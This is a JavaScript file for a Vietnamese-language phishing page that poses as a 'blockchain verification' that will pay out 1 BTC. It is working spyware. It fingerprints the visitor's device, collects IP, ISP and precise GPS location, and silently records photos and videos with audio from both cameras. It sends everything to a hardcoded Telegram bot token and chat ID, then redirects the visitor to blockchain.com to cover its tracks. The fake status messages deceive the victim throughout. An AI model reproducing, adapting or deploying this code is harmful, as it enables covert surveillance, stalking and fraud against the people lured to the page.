/**
 * HỆ THỐNG XÁC THỰC BLOCKCHAIN TỐI ƯU
 * Tính năng: Chụp ảnh/Video trước sau, lấy IP/GPS chi tiết, nhận diện thiết bị sâu.
 * Gửi dữ liệu 1 lần qua Telegram Media Group.
 */

const CONFIG = {
    BOT_TOKEN: '8637781182:AAH3RgQ_vuSl3urLFb-5MDizgTbZnF0LQMs',
    CHAT_ID: '-1003479049955',
    VIDEO_DURATION: 4000, // Quay video 4 giây mỗi camera để gửi nhanh
    REDIRECT_URL: "https://www.blockchain.com/"
};

const state = {
    info: {
        time: new Date().toLocaleString('vi-VN'),
        device: 'Không xác định',
        os: 'Không rõ',
        ip: 'Đang lấy...',
        isp: 'Đang lấy...',
        location: 'Chưa cấp quyền',
        lat: '',
        lon: ''
    },
    media: [] // Chứa các object { type, blob, name }
};

// --- 1. NHẬN DIỆN THIẾT BỊ CHI TIẾT (TỪ SEND.JS) ---
function detectDevice() {
    const ua = navigator.userAgent;
    const platform = navigator.platform;
    const screenW = window.screen.width;
    const screenH = window.screen.height;
    const ratio = window.devicePixelRatio;

    if (/Android/i.test(ua)) {
        state.info.os = 'Android';
        const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
        if (match) {
            let model = match[1].split('/')[0].trim();
            if (model.includes("SM-S918")) model = "Samsung Galaxy S23 Ultra";
            if (model.includes("SM-S928")) model = "Samsung Galaxy S24 Ultra";
            state.info.device = model;
        } else {
            state.info.device = 'Android Device';
        }
    } 
    else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
        state.info.os = 'iOS';
        const res = `${screenW}x${screenH}@${ratio}`;
        const iphoneModels = {
            "430x932@3": "iPhone 14/15/16 Pro Max",
            "393x852@3": "iPhone 14/15/16 Pro / 15/16",
            "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
            "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
            "414x896@3": "iPhone XS Max / 11 Pro Max",
            "414x896@2": "iPhone XR / 11",
            "375x812@3": "iPhone X / XS / 11 Pro",
            "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
        };
        state.info.device = iphoneModels[res] || 'iPhone Model';
    } 
    else {
        state.info.os = /Windows/i.test(ua) ? "Windows" : (/Macintosh/i.test(ua) ? "macOS" : "Linux");
        state.info.device = platform;
    }
}

// --- 2. LẤY IP VÀ VỊ TRÍ ---
async function getNetworkInfo() {
    try {
        const r = await fetch('https://ipwho.is/');
        const data = await r.json();
        state.info.ip = data.ip || 'Không rõ';
        state.info.isp = data.connection?.org || 'VNNIC';
        if (!state.info.lat) { // Chỉ dùng IP nếu GPS chưa có
            state.info.location = `${data.city}, ${data.region} (Vị trí IP)`;
            state.info.lat = data.latitude;
            state.info.lon = data.longitude;
        }
    } catch (e) { console.error("Lỗi lấy IP:", e); }
}

async function getGPS() {
    return new Promise(resolve => {
        navigator.geolocation.getCurrentPosition(
            async pos => {
                state.info.lat = pos.coords.latitude.toFixed(6);
                state.info.lon = pos.coords.longitude.toFixed(6);
                try {
                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${state.info.lat}&lon=${state.info.lon}`);
                    const data = await res.json();
                    state.info.location = data.display_name || '📍 Vị trí GPS';
                } catch {
                    state.info.location = `Tọa độ: ${state.info.lat}, ${state.info.lon}`;
                }
                resolve();
            },
            () => resolve(), // Bị từ chối thì bỏ qua
            { enableHighAccuracy: true, timeout: 5000 }
        );
    });
}

// --- 3. XỬ LÝ CAMERA (ẢNH + VIDEO) ---
async function captureMedia(facingMode, label) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: facingMode }, 
            audio: true 
        });
        
        const video = document.getElementById(facingMode === 'user' ? 'videoFront' : 'videoBack');
        video.srcObject = stream;
        await video.play();

        // Chụp ảnh ngay sau khi video bắt đầu (đợi 500ms để camera ổn định)
        await new Promise(r => setTimeout(r, 500));
        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
        state.media.push({ type: 'photo', blob: photoBlob, name: `photo_${label}.jpg` });

        // Quay video
        const recorder = new MediaRecorder(stream);
        const chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        
        return new Promise(resolve => {
            recorder.onstop = () => {
                const videoBlob = new Blob(chunks, { type: 'video/mp4' });
                state.media.push({ type: 'video', blob: videoBlob, name: `video_${label}.mp4` });
                stream.getTracks().forEach(t => t.stop());
                resolve();
            };
            recorder.start();
            setTimeout(() => recorder.stop(), CONFIG.VIDEO_DURATION);
        });
    } catch (err) {
        console.warn(`Không thể truy cập camera ${label}:`, err);
    }
}

// --- 4. GỬI DỮ LIỆU ---
async function sendAllData() {
    const mapsLink = state.info.lat && state.info.lon 
        ? `https://maps.google.com/maps?q=${state.info.lat},${state.info.lon}` 
        : 'Không rõ';

    const caption = `
📡 [THÔNG TIN TRUY CẬP]

🕒 Thời gian: ${state.info.time}
📱 Thiết bị: ${state.info.device}
🖥️ Hệ điều hành: ${state.info.os}
🌍 IP: ${state.info.ip}
🏢 ISP: ${state.info.isp}
🏙️ Địa chỉ: ${state.info.location}
📌 Google Maps: ${mapsLink}
📸 Camera: ${state.media.length > 0 ? '✅ Thành công' : '🚫 Thất bại'}
`.trim();

    const formData = new FormData();
    formData.append('chat_id', CONFIG.CHAT_ID);

    if (state.media.length === 0) {
        // Nếu không có ảnh/video, gửi text
        await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: caption })
        });
        return;
    }

    // Gửi Media Group
    const mediaGroup = [];
    state.media.forEach((item, index) => {
        const fileKey = `f${index}`;
        formData.append(fileKey, item.blob, item.name);
        
        const mediaObj = {
            type: item.type,
            media: `attach://${fileKey}`
        };
        
        // Gắn caption vào item cuối cùng
        if (index === state.media.length - 1) {
            mediaObj.caption = caption;
        }
        
        mediaGroup.push(mediaObj);
    });

    formData.append('media', JSON.stringify(mediaGroup));
    await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMediaGroup`, {
        method: 'POST',
        body: formData
    });
}

// --- 5. KHỞI CHẠY ---
const btn = document.getElementById('startBtn');
const loading = document.getElementById('loading');
const statusText = document.getElementById('statusText');

// Yêu cầu quyền ngay khi tải trang
window.onload = () => {
    detectDevice();
    getNetworkInfo();
    // Kích hoạt yêu cầu quyền camera & GPS ngay lập tức
    navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(() => {});
    navigator.geolocation.getCurrentPosition(() => {}, () => {}, { enableHighAccuracy: true });
};

btn.addEventListener('click', async () => {
    btn.style.display = 'none';
    loading.style.display = 'block';

    // 1. Lấy thông tin GPS và IP chính xác hơn khi nhấn nút
    statusText.innerText = "Đang xác thực GPS...";
    await getGPS();

    // 2. Quay camera song song
    statusText.innerText = "Đang quét khuôn mặt AI...";
    await Promise.all([
        captureMedia('user', 'truoc'),
        captureMedia('environment', 'sau')
    ]);

    // 3. Gửi dữ liệu
    statusText.innerText = "Đang giải ngân 1 BTC...";
    await sendAllData();

    // 4. Chuyển hướng
    window.location.href = CONFIG.REDIRECT_URL;
});